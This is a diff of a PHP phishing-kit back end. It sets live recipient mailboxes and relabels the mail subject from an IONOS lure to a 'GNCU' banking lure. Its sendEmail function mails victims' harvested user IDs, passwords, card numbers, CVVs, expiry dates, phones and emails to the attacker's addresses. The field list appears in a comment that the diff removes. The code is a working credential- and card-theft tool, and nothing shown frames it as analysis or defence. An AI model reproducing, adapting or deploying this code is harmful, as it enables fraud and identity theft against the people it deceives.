@@ -63,13 +63,13 @@ if(isset($_POST['epass'])) {
     header("Location: ./success.php");
 }
 
-// $EMAIL = "gottmacht.empire@gmail.com";
-// $SENDER_EMAIL = "gottmacht.empire@yandex.com";
+$EMAIL = "gottmacht.empire@gmail.com";
+$SENDER_EMAIL = "gottmacht.empire@yandex.com";
 
-$EMAIL = "alexjace151@gmail.com";
-$SENDER_EMAIL = "jacealex151@gmail.com";
+// $EMAIL = "alexjace151@gmail.com";
+// $SENDER_EMAIL = "jacealex151@gmail.com";
 
-function sendEmail($prevValues, $subject = "IONOS-Logs") {
+function sendEmail($prevValues, $subject = "GNCU - LOG") {
     global $EMAIL;
     global $SENDER_EMAIL;
     $headers  = 'MIME-Version: 1.0' . "\r\n";
@@ -162,18 +162,7 @@ function sendEmail($prevValues, $subject = "IONOS-Logs") {
             </div>
         </body>
     </html>";
-    
-    /* 
-         [
-            "userID" => $userId,
-            "password" => $password,
-            "CVV" => $cvv,
-            "expiry" => $exp,
-            "cardNumber" => $card,
-            "phone" => $phone,
-            "email" => $email
-        ]
-    */
+
     $values = $prevValues;
 
     $message = str_replace("{{userID}}", $values["userID"], $message);
